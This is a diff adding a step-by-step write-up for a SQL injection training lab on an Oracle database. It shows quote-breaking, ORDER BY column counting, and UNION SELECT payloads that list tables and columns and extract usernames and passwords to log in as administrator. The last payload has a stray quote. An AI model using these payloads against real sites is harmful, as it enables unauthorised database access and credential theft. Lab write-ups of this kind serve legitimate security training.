@@ -8,42 +8,112 @@ To solve the lab, log in as the `administrator` user.
 
 ***
 
-Hack
+Let's Start !!
+
+First We Visit The Website !!
 
 <figure><img src="../../../.gitbook/assets/image (519).png" alt=""><figcaption></figcaption></figure>
 
-Hack
+We Try To Inject Single Quote `'` To Break The Backend Query !!
+
+Our Backend Query Is This Below !!
+
+```
+SELECT name,description FROM products WHERE category = 'Pets' 
+```
+
+When We Inject The Single Quote `'` Actually The Create Error In The SQL Query !!
+
+```
+SELECT name,description FROM products WHERE category = 'Pets''
+```
 
 <figure><img src="../../../.gitbook/assets/image (520).png" alt=""><figcaption></figcaption></figure>
 
-hack
+We Try To Inject `'--` To Check The Backend Query !!
+
+Our Backend Query Is This Below !!
+
+```
+SELECT name,description FROM products WHERE category = 'Pets' 
+```
+
+When We Inject `'--` They Fix The Query and Give No Error ,In SQL `--` Refer To Comment Out In Code !!
+
+```
+SELECT name,description FROM products WHERE category = 'Pets'--'
+```
 
 <figure><img src="../../../.gitbook/assets/image (521).png" alt=""><figcaption></figcaption></figure>
 
-hack
+**Finding Number of Columns**
+
+**Method – ORDER BY**
+
+```
+' ORDER BY 1--
+' ORDER BY 2--
+' ORDER BY 3--
+```
+
+If `ORDER BY 3` fails, query has 2 columns.
 
 <figure><img src="../../../.gitbook/assets/image (522).png" alt=""><figcaption></figcaption></figure>
 
-Hack
+That `ORDER BY 3` fails, query has 2 columns.
+
+it's Mean We assume Right Backend Query They have only Two Columns First is `name` and Second is `description` !!
+
+```
+SELECT name,description FROM products WHERE category = 'Pets'
+```
 
 <figure><img src="../../../.gitbook/assets/image (523).png" alt=""><figcaption></figcaption></figure>
 
-Hack
+Also We Use.There is a built-in table on Oracle called `dual` which you can use for this purpose. For example: `UNION SELECT 'abc' FROM dual` if it's Return Content It's Mean First Column is String !!
+
+Let's We Use In Our Two Column Table !!
+
+```
+'UNION SELECT 'a','b' FROM dual--
+```
+
+Our Backend Code Look's Like This After Injecting This Query !!
+
+```
+SELECT name,description FROM products WHERE category = 'Gifts'
+UNION
+SELECT 'a','b' FROM dual
+```
+
+Then See If Our First and Second Both Column is String They Return No Error !!
 
 <figure><img src="../../../.gitbook/assets/image (524).png" alt=""><figcaption></figcaption></figure>
 
-hack
+Use the following payload to retrieve the list of tables in the database:
+
+```
+' UNION SELECT table_name,NULL FROM all_tables--
+```
 
 <figure><img src="../../../.gitbook/assets/image (525).png" alt=""><figcaption></figcaption></figure>
 
-Hack
+Use the following payload (replacing the table name) to retrieve the details of the columns in the table:
+
+```
+' UNION SELECT column_name,NULL FROM all_tab_columns WHERE table_name='USERS_IQWYKW'--
+```
 
 <figure><img src="../../../.gitbook/assets/image (526).png" alt=""><figcaption></figcaption></figure>
 
-hack
+Use the following payload (replacing the table and column names) to retrieve the usernames and passwords for all users:
+
+```
+' UNION SELECT USERNAME_KAYZDO,PASSWORD_BXYLNM FROM USERS_IQWYKW'--
+```
 
 <figure><img src="../../../.gitbook/assets/image (527).png" alt=""><figcaption></figcaption></figure>
 
-hack
+Find the password for the `administrator` user, and use it to log in.
 
 <figure><img src="../../../.gitbook/assets/image (528).png" alt=""><figcaption></figcaption></figure>
